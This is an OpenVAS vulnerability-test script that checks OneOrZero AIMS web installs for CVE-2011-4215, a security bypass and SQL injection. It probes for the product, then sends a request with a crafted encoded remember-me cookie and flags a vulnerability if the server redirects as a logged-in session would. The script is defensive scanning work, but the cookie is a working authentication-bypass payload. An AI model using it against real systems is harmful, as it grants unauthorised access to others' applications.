###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_OneOrZero_50107.nasl 13 2013-10-27 12:16:33Z jan $
#
# OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "OneOrZero AIMS is prone to a security-bypass vulnerability and an SQL-
injection vulnerability.

An attacker can exploit these issues to bypass certain security
restrictions, perform unauthorized actions, bypass filtering, and
modify the logic of SQL queries.

OneOrZero AIMS 2.7.0 is affected; other versions may also be affected.";


if (description)
{
 script_id(103304);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)");
 script_cve_id("CVE-2011-4215");
 script_bugtraq_id(50107);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50107");
 script_xref(name : "URL" , value : "http://oneorzero.com/");
 script_xref(name : "URL" , value : "http://en.securitylab.ru/lab/PT-2011-20");
 script_xref(name : "URL" , value : "http://en.securitylab.ru/lab/PT-2011-21");
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/800227");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed OneOrZero AIMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/ooz",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered by OneOrZero")) {

    host = get_host_name();

    req = string(
		 "GET /ooz/index.php HTTP/1.1\r\n",
		 "Host: ", host,"\r\n",
		 "Cookie: oozimsrememberme=eJwrtjI0tlJKTMnNzMssLilKLMkvUrJ29PQNBgBsjwh2;\r\n",
		 "\r\n\r\n"
		 );

    res = http_keepalive_send_recv(port:port,data:req);

    if("Location: ?controller=launch" >< res) {
      security_hole(port:port);
      exit(0);
    }  
  }
}

exit(0);
